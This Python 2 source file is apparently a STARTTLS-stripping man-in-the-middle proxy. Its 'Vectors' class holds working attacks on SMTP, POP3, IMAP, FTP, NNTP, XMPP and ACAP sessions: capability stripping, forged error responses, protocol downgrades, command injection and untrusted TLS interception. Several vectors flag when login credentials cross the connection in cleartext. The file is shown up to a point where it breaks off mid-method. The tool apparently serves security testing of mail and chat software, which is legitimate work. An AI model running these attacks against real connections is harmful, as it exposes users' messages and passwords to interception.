#! /usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : tintinweb@oststrom.com <github.com/tintinweb>
'''
                  inbound                    outbound
[inbound_peer]<------------>[listen:proxy]<------------->[outbound_peer/target]
'''
import sys
import logging
import socket
import select
import ssl
import time
import re

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
logger = logging.getLogger(__name__)

class SessionTerminatedException(Exception):pass
class ProtocolViolationException(Exception):pass

class TcpSockBuff(object):
    ''' Wrapped Tcp Socket with access to last sent/received data '''
    def __init__(self, sock, peer=None):
        self.socket = None
        self.socket_ssl = None
        self.recvbuf = ''
        self.sndbuf = ''
        self.peer = peer
        self._init(sock)
        
    def _init(self, sock):
        self.socket = sock
        
    def connect(self, target):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return self.socket.connect(target)
    
    def accept(self):
        return self.socket.accept()
                
    def recv(self, buflen=8*1024):
        if self.socket_ssl:
            self.recvbuf = self.socket_ssl.read(buflen)
        else:
            self.recvbuf = self.socket.recv(buflen)
        return self.recvbuf
    
    def send(self, data):
        if self.socket_ssl:
            self.socket_ssl.write(data)
        else:
            self.socket.send(data)
        self.sndbuf = data
        
    def sendall(self, data):
        if self.socket_ssl:
            self.send(data)
        else:
            self.socket.sendall(data)
        self.sndbuf = data
        
    def ssl_wrap_socket(self, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ssl.wrap_socket(*args, **kwargs)
    
    def ssl_wrap_socket_with_context(self, ctx, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ctx.wrap_socket(*args, **kwargs)
        
class ProtocolDetect(object):
    PROTO_SMTP = 25
    PROTO_XMPP = 5222
    PROTO_IMAP = 143
    PROTO_FTP = 21
    PROTO_POP3 = 110
    PROTO_NNTP = 119
    PROTO_IRC = 6667
    PROTO_ACAP = 675
    
    PORTMAP = {25:  PROTO_SMTP,
               5222:PROTO_XMPP,
               110: PROTO_POP3,
               143: PROTO_IMAP,
               21: PROTO_FTP,
               119: PROTO_NNTP,
               6667: PROTO_IRC,
               675: PROTO_ACAP
               }
    
    KEYWORDS = ((['ehlo', 'helo','starttls','rcpt to:','mail from:'], PROTO_SMTP),
                (['xmpp'], PROTO_XMPP),
                (['. capability'], PROTO_IMAP),
                (['auth tls'], PROTO_FTP)
                )
    
    def __init__(self, target=None):
        self.protocol_id = None
        self.history = []
        if target:
            self.protocol_id = self.PORTMAP.get(target[1])
            if self.protocol_id:
                logging.debug("%s - protocol detected (target port)"%repr(self))
    
    def __str__(self):
        return repr(self.proto_id_to_name(self.protocol_id))
    
    def __repr__(self):
        return "<ProtocolDetect %s protocol_id=%s len_history=%d>"%(hex(id(self)), self.proto_id_to_name(self.protocol_id), len(self.history))
            
    def proto_id_to_name(self, id):
        if not id:
            return id
        for p in (a for a in dir(self) if a.startswith("PROTO_")):
            if getattr(self, p)==id:
                return p
    
    def detect(self, data):
        if self.protocol_id:
            return self.protocol_id
        self.history.append(data)
        for keywordlist,proto in self.KEYWORDS:
            if any(k in data.lower() for k in keywordlist):
                self.protocol_id = proto
                logging.debug("%s - protocol detected (protocol messages)"%repr(self))
                return
        
class Session(object):
    ''' Proxy session from client <-> proxy <-> server 
        @param inbound: inbound socket
        @param outbound: outbound socket
        @param target: target tuple ('ip',port) 
        @param buffer_size: socket buff size'''
    
    def __init__(self, proxy, inbound=None, outbound=None, target=None, buffer_size=4096):
        self.proxy = proxy
        self.bind = proxy.getsockname()
        self.inbound = TcpSockBuff(inbound)
        self.outbound = TcpSockBuff(outbound, peer=target)
        self.buffer_size = buffer_size
        self.protocol = ProtocolDetect(target=target)
    
    def __repr__(self):
        return "<Session %s [client: %s] --> [prxy: %s] --> [target: %s]>"%(hex(id(self)),
                                                                            self.inbound.peer,
                                                                            self.bind,
                                                                            self.outbound.peer)
    def __str__(self):
        return "<Session %s>"%hex(id(self))
        
    def connect(self, target):
        self.outbound.peer = target
        logger.info("%s connecting to target %s"%(self, repr(target)))
        return self.outbound.connect(target)
    
    def accept(self):
        sock, addr = self.proxy.accept()
        self.inbound = TcpSockBuff(sock)
        self.inbound.peer = addr
        logger.info("%s client %s has connected"%(self,repr(self.inbound.peer)))
        return sock,
    
    def get_peer_sockets(self):
        return [self.inbound.socket, self.outbound.socket]
    
    def notify_read(self, sock):
        if sock == self.proxy:
            self.accept()
            self.connect(self.outbound.peer)
        elif sock == self.inbound.socket:
            # new client -> prxy - data
            self.on_recv(self.inbound, self.outbound, self)
        elif sock == self.outbound.socket:
            # new sprxy <- target - data
            self.on_recv(self.outbound, self.inbound, self)
        return 
    
    def close(self):
        self.outbound.socket.close()
        self.inbound.socket.close()
        raise SessionTerminatedException()
    
    def on_recv(self, s_in, s_out, session):
        data = s_in.recv(session.buffer_size)
        self.protocol.detect(data)
        if not len(data):
            return session.close()
        if s_in == session.inbound:
            data = self.mangle_client_data(session, data)
        elif s_in == session.outbound:
            data = self.mangle_server_data(session, data)
        if data:
            s_out.sendall(data)
        return data
    
    def inbound_starttls(self, session, sslctx=None): 
        raise NotImplementedError("Implement this in proto class")
    def outbound_starttls(self, session, sslctx=None): 
        raise NotImplementedError("Implement this in proto class")
    
    def mangle_client_data(self, session, data, rewrite): return data
    def mangle_server_data(self, session, data, rewrite): return data
    
class ProxyServer(object):
    '''Proxy Class'''
    
    def __init__(self, listen, target, buffer_size=4096, delay=0.0001):
        self.input_list = set([])
        self.sessions = {}  # sock:Session()
        self.callbacks = {} # name: [f,..]
        #
        self.listen = listen
        self.target = target
        #
        self.buffer_size = buffer_size
        self.delay = delay
        self.inbound = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.inbound.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.inbound.bind(listen)
        self.inbound.listen(200)
        
    def __str__(self):
        return "<Proxy %s listen=%s target=%s>"%(hex(id(self)),self.listen, self.target)

    def get_session_by_client_sock(self, sock):
        return self.sessions.get(sock)

    def set_callback(self, name, f):
        self.callbacks[name] = f

    def main_loop(self):
        self.input_list.add(self.inbound)
        while True:
            time.sleep(self.delay)
            inputready, _, _ =  select.select(self.input_list, [], [])
            
            for sock in inputready:
                session = None
                try:
                    if sock == self.inbound:
                        # on_accept
                        session = Session(sock, target=self.target)
                        for k,v in self.callbacks.iteritems():
                            setattr(session, k, v)
                        session.notify_read(sock)
                        for s in session.get_peer_sockets():
                            self.sessions[s]=session
                        self.input_list.update(session.get_peer_sockets())
                    else:
                        # on_recv
                        try:
                            session = self.get_session_by_client_sock(sock)
                            session.notify_read(sock)
                        except SessionTerminatedException:
                            self.input_list.difference_update(session.get_peer_sockets())
                            logger.warning("%s terminated."%session)
                except Exception, e:
                    logger.warning("main: %s"%repr(e))
                    if session:
                        self.input_list.difference_update(session.get_peer_sockets())
                    else:
                        self.inbound.remove(sock)
                    raise        

class Vectors:
    _TLS_CERTFILE = "server.pem"
    _TLS_KEYFILE = "server.pem"
    class SMTP:
        _PROTO_ID = 25
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                    features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
                    if not features[-1].startswith("250 "):
                        features[-1] = features[-1].replace("250-","250 ")  # end marker
                    data = '\r\n'.join(features)+'\r\n' 
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class ProtocolDowngradeToV2:
            ''' Return IMAP2 instead of IMAP4 in initial server response
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw.lower() in data.lower() for kw in ("IMAP4","* OK ")):
                    session.inbound.sendall("OK IMAP2 Server Ready\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("OK IMAP2 Server Ready\r\n")))
                    data=None
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class StripWithInvalidResponseCode:
            ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
                2) Respond to client STARTTLS with invalid response code
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                    features = list(data.strip().split("\r\n"))
                    features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
                    #if "STARTTLS" in data:
                    #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
                    data = '\r\n'.join(features)+'\r\n' 
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("200 STRIPTLS\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class StripWithTemporaryError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("454 TLS not available due to temporary reason\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("454 TLS not available due to temporary reason\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
    
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("501 Syntax error\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("501 Syntax error\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("220 Go ahead\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("220 Go ahead\r\n")))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if "220" not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class ProtocolDowngradeStripExtendedMode:
            ''' Return error on EHLO to force peer to non-extended mode
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.lower().startswith("ehlo "):
                    session.inbound.sendall("502 Error: command \"EHLO\" not implemented\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Error: command \"EHLO\" not implemented\r\n")))
                    data=None
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
            
        class InjectCommand:
            ''' 1) Append command to STARTTLS\r\n.
                2) untrusted intercept to check if we get an invalid command response from server
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    data += "INJECTED_INVALID_COMMAND\r\n"
                    #logging.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
                    try:
                        Vectors.SMTP.UntrustedIntercept.mangle_client_data(session, data, rewrite)
                    except ssl.SSLEOFError, se:
                        logging.info("%s - Server failed to negotiate SSL with Exception: %s"%(session, repr(se))) 
                        session.close()
                elif "mail from" in data.lower():
                    rewrite.set_result(session, True)
                return data
    
    class POP3:
        _PROTO_ID = 110

        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STLS support
                2) raise exception if client tries to negotiated STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if data.lower().startswith('+ok capability'):
                    features = [f for f in data.strip().split('\r\n') if not "stls" in f.lower()]
                    data = '\r\n'.join(features)+'\r\n'
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.lower().startswith("stls"):
                    raise ProtocolViolationException("whoop!? client sent STLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data

        class StripWithError:
            ''' 1) force server error on client sending STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "stls" == data.strip().lower():
                    session.inbound.sendall("-ERR unknown command\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("-ERR unknown command\r\n")))
                    data=None
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "stls"==data.strip().lower():
                    # do inbound STARTTLS
                    session.inbound.sendall("+OK Begin TLS negotiation\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("+OK Begin TLS negotiation\r\n")))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_CERTFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if "+OK" not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif any(c in data.lower() for c in ('list','user ','pass ')):
                    rewrite.set_result(session, True)
                return data
            
    class IMAP:
        _PROTO_ID = 143
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "CAPABILITY " in data:
                    # rfc2595
                    data = data.replace(" STARTTLS","").replace(" LOGINDISABLED","")
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data
            
        class StripWithError:
            ''' 1) force server error on client sending STLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.strip().lower().endswith("starttls"):
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall("%s BAD unknown command\r\n"%id)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s BAD unknown command\r\n"%id)))
                    data=None
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if data.strip().lower().endswith("starttls"):
                    id = data.split(' ',1)[0].strip()
                    # do inbound STARTTLS
                    session.inbound.sendall("%s OK Begin TLS negotation now\r\n"%id)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s OK Begin TLS negotation now\r\n"%id)))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_CERTFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if "%s OK"%id not in resp_data:
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif " LOGIN " in data:
                    rewrite.set_result(session, True)
                return data
            
    class FTP:
        _PROTO_ID = 21
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce AUTH TLS support
                2) raise exception if client tries to negotiated AUTH TLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if session.outbound.sndbuf.strip().lower()=="feat" \
                    and "AUTH TLS" in data:
                    features = (f for f in data.strip().split('\n') if not "AUTH TLS" in f)
                    data = '\n'.join(features)+"\r\n"
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending AUTH TLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    session.inbound.sendall("500 AUTH TLS not understood\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("500 AUTH TLS not understood\r\n")))
                    data=None
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "AUTH TLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("234 OK Begin TLS negotation now\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("234 OK Begin TLS negotation now\r\n")))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("234"):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif "USER " in data:
                    rewrite.set_result(session, True)
                return data
            
    class NNTP:
        _PROTO_ID = 119
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if session.outbound.sndbuf.strip().lower()=="capabilities" \
                    and "STARTTLS" in data:
                    features = (f for f in data.strip().split('\n') if not "STARTTLS" in f)
                    data = '\n'.join(features)+"\r\n"
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    session.inbound.sendall("502 Command unavailable\r\n")  # or 580 Can not initiate TLS negotiation
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Command unavailable\r\n")))
                    data=None
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "STARTTLS" in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("382 Continue with TLS negotiation\r\n")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("382 Continue with TLS negotiation\r\n")))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("382"):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                    
                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()
    
                    data=None
                elif "GROUP " in data:
                    rewrite.set_result(session, True)
                return data
    
    class XMPP:
        _PROTO_ID = 5222
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "<starttls" in data:
                    start = data.index("<starttls")
                    end = data.index("</starttls>",start)+len("</starttls>")
                    data = data[:start] + data[end:]        # strip starttls from capabilities
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls" in data:
                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                    #<failure/> or <proceed/>
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                    #data=None
                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
                    rewrite.set_result(session, True)
                return data 

        class StripInboundTLS:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) If starttls is required outbound, leave inbound connection plain - outbound starttls
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if "<starttls" in data:
                    start = data.index("<starttls")
                    end = data.index("</starttls>",start)+len("</starttls>")
                    starttls_args = data[start:end]
                    data = data[:start] + data[end:]        # strip inbound starttls
                    if "required" in starttls_args:
                        # do outbound starttls as required by server
                        session.outbound.sendall("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
                        logging.debug("%s [client] => [server][mangled] %s"%(session,repr("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
                        resp_data = session.outbound.recv()
                        if not resp_data.startswith("<proceed "):
                            raise ProtocolViolationException("whoop!? server announced STARTTLS *required* but fails to proceed.  proto violation: %s"%repr(resp_data))

                        logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                        session.outbound.ssl_wrap_socket()

                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls" in data:
                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                    #<failure/> or <proceed/>
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                    #data=None
                elif any(c in data.lower() for c in ("</auth>","<query","<iq","<username")):
                    rewrite.set_result(session, True)
                return data

        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if "<starttls " in data:
                    # do inbound STARTTLS
                    session.inbound.sendall("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE,
                                            keyfile=Vectors._TLS_KEYFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl

                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
                    if not resp_data.startswith("<proceed "):
                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))

                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                    session.outbound.ssl_wrap_socket()

                    data=None
                elif "</auth>" in data:
                    rewrite.set_result(session, True)
                return data

    class ACAP:
        #rfc2244, rfc2595
        _PROTO_ID = 675
        _REX_CAP = re.compile(r"\(([^\)]+)\)")
        class StripFromCapabilities:
            ''' 1) Force Server response to *NOT* announce STARTTLS support
                2) raise exception if client tries to negotiated STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                if all(kw in data for kw in ("ACAP","STARTTLS")):
                    features = Vectors.ACAP._REX_CAP.findall(data)  # features w/o parentheses
                    data = ' '.join("(%s)"%f for f in features if not "STARTTLS" in f)
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                elif " AUTHENTICATE " in data:       
                    rewrite.set_result(session, True)
                return data
        
        class StripWithError:
            ''' 1) force server error on client sending STARTTLS
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall('%s BAD "command unknown or arguments invalid"'%id)  # or 580 Can not initiate TLS negotiation
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr('%s BAD "command unknown or arguments invalid"'%id)))
                    data=None
                elif " AUTHENTICATE " in data:
                    rewrite.set_result(session, True)
                return data
    
        class UntrustedIntercept:
            ''' 1) Do not mangle server data
                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
                   in case client does not check keys
            '''
            @staticmethod
            def mangle_server_data(session, data, rewrite):
                return data
            @staticmethod
            def mangle_client_data(session, data, rewrite):
                if " STARTTLS" in data:
                    # do inbound STARTTLS
                    id = data.split(' ',1)[0].strip()
                    session.inbound.sendall('%s OK "Begin TLS negotiation now"'%id)
                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr('%s OK "Begin TLS negotiation now"'%id)))
                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    context.load_cert_chain(certfile=Vectors._TLS_CERTFILE, 
                                            keyfile=Vectors._TLS_KEYFILE)
                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                    # outbound ssl
                    
                    session.outbound.sendall(data)
                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                    resp_data = session.outbound.recv()
                    logging.debug("%s          <= [server]          %s"%(session,repr(resp_data)))
